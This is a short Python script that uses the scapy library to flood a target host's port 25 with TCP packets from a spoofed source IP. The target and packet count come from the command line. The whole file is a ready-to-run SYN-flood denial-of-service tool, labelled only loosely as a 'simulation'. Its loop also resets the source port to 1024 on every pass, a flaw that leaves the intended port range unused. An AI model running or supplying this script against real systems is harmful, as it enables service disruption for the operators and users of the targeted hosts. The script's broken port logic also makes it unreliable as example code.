from scapy.all import *
from scapy.layers.inet import TCP, IP
import time
import sys

src = "192.168.222.100"
tgt = sys.argv[1]
amount = 1024 + int(sys.argv[2])

def synFlood():

    for sport in range(1024, amount):
        sport = 1024
        L3 = IP(src=src, dst=tgt)
        L4 = TCP(sport=sport, dport=25)
        pkt = L3 / L4
        send(pkt)
        print("Flood!!! targeting: {} SourcePort: {}\n".format(tgt,str(sport)))
        time.sleep(0.1)

print("     \n###  Starting flooding {}    ###".format(tgt))
print("     ###  Amount: {}   |   Delay: 0.1 ###".format(sys.argv[2]))
synFlood()
print("     \n###  End of flooding simulation  ###")
